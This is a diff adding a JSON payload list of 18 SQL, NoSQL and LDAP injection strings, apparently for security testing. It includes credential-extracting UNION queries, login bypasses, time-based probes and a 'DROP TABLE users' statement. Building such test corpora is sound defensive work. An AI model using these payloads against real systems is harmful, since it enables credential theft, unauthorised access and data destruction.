@@ -1,0 +1,182 @@
+[
+  {
+    "id": "sqli-001",
+    "family": "sqli",
+    "subtype": "error-based",
+    "payload_string": "' OR 1=1--",
+    "context": "string",
+    "description": "Basic error-based SQL injection with tautology",
+    "references": ["https://owasp.org/www-community/attacks/SQL_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "sqli-002",
+    "family": "sqli",
+    "subtype": "error-based",
+    "payload_string": "' UNION SELECT NULL--",
+    "context": "string",
+    "description": "UNION-based SQL injection for column enumeration",
+    "references": ["https://portswigger.net/web-security/sql-injection/union-attacks"],
+    "platform_specific": {}
+  },
+  {
+    "id": "sqli-003",
+    "family": "sqli",
+    "subtype": "blind",
+    "payload_string": "' AND 1=1--",
+    "context": "string",
+    "description": "Boolean-based blind SQL injection true condition",
+    "references": ["https://owasp.org/www-community/attacks/SQL_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "sqli-004",
+    "family": "sqli",
+    "subtype": "blind",
+    "payload_string": "' AND 1=2--",
+    "context": "string",
+    "description": "Boolean-based blind SQL injection false condition",
+    "references": ["https://owasp.org/www-community/attacks/SQL_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "sqli-005",
+    "family": "sqli",
+    "subtype": "time-based",
+    "payload_string": "' OR SLEEP(5)--",
+    "context": "string",
+    "description": "Time-based blind SQL injection for MySQL",
+    "references": ["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
+    "platform_specific": {"mysql": true}
+  },
+  {
+    "id": "sqli-006",
+    "family": "sqli",
+    "subtype": "time-based",
+    "payload_string": "'; WAITFOR DELAY '0:0:5'--",
+    "context": "string",
+    "description": "Time-based blind SQL injection for MSSQL",
+    "references": ["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
+    "platform_specific": {"mssql": true}
+  },
+  {
+    "id": "sqli-007",
+    "family": "sqli",
+    "subtype": "time-based",
+    "payload_string": "'; SELECT PG_SLEEP(5)--",
+    "context": "string",
+    "description": "Time-based blind SQL injection for PostgreSQL",
+    "references": ["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
+    "platform_specific": {"postgresql": true}
+  },
+  {
+    "id": "sqli-008",
+    "family": "sqli",
+    "subtype": "union",
+    "payload_string": "' UNION SELECT username,password FROM users--",
+    "context": "string",
+    "description": "UNION-based extraction of credentials",
+    "references": ["https://portswigger.net/web-security/sql-injection/union-attacks"],
+    "platform_specific": {}
+  },
+  {
+    "id": "sqli-009",
+    "family": "sqli",
+    "subtype": "error-based",
+    "payload_string": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+    "context": "string",
+    "description": "Error-based SQL injection using EXTRACTVALUE for MySQL",
+    "references": ["https://www.exploit-db.com/"],
+    "platform_specific": {"mysql": true}
+  },
+  {
+    "id": "sqli-010",
+    "family": "sqli",
+    "subtype": "error-based",
+    "payload_string": "' AND 1=CONVERT(int,@@VERSION)--",
+    "context": "string",
+    "description": "Error-based SQL injection using CONVERT for MSSQL",
+    "references": ["https://www.exploit-db.com/"],
+    "platform_specific": {"mssql": true}
+  },
+  {
+    "id": "sqli-011",
+    "family": "sqli",
+    "subtype": "second-order",
+    "payload_string": "admin'--",
+    "context": "string",
+    "description": "Second-order SQL injection via stored login bypass",
+    "references": ["https://owasp.org/www-community/attacks/SQL_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "sqli-012",
+    "family": "sqli",
+    "subtype": "blind",
+    "payload_string": "' AND (SELECT LENGTH(database()))=1--",
+    "context": "string",
+    "description": "Blind SQL injection to enumerate database name length",
+    "references": ["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "sqli-013",
+    "family": "sqli",
+    "subtype": "error-based",
+    "payload_string": "1' GROUP BY CONCAT(version(),0x3a,FLOOR(RAND(0)*2)) HAVING MIN(0)--",
+    "context": "string",
+    "description": "Error-based SQL injection using GROUP BY with RAND",
+    "references": ["https://www.exploit-db.com/"],
+    "platform_specific": {"mysql": true}
+  },
+  {
+    "id": "sqli-014",
+    "family": "sqli",
+    "subtype": "union",
+    "payload_string": "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+    "context": "string",
+    "description": "UNION-based table enumeration via information_schema",
+    "references": ["https://portswigger.net/web-security/sql-injection/union-attacks"],
+    "platform_specific": {}
+  },
+  {
+    "id": "sqli-015",
+    "family": "sqli",
+    "subtype": "stacked",
+    "payload_string": "'; DROP TABLE users;--",
+    "context": "string",
+    "description": "Stacked queries SQL injection for destructive testing",
+    "references": ["https://owasp.org/www-community/attacks/SQL_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "sqli-016",
+    "family": "sqli",
+    "subtype": "nosql",
+    "payload_string": "[$ne]",
+    "context": "json",
+    "description": "NoSQL injection using MongoDB $ne operator",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_NoSQL_Injection"],
+    "platform_specific": {"mongodb": true}
+  },
+  {
+    "id": "sqli-017",
+    "family": "sqli",
+    "subtype": "nosql",
+    "payload_string": "admin' || '1'=='1",
+    "context": "json",
+    "description": "NoSQL injection using string concatenation bypass",
+    "references": ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_NoSQL_Injection"],
+    "platform_specific": {"mongodb": true}
+  },
+  {
+    "id": "sqli-018",
+    "family": "sqli",
+    "subtype": "ldap",
+    "payload_string": "*)(uid=*))(|(uid=*",
+    "context": "string",
+    "description": "LDAP injection for authentication bypass",
+    "references": ["https://owasp.org/www-community/attacks/LDAP_Injection"],
+    "platform_specific": {}
+  }
+]
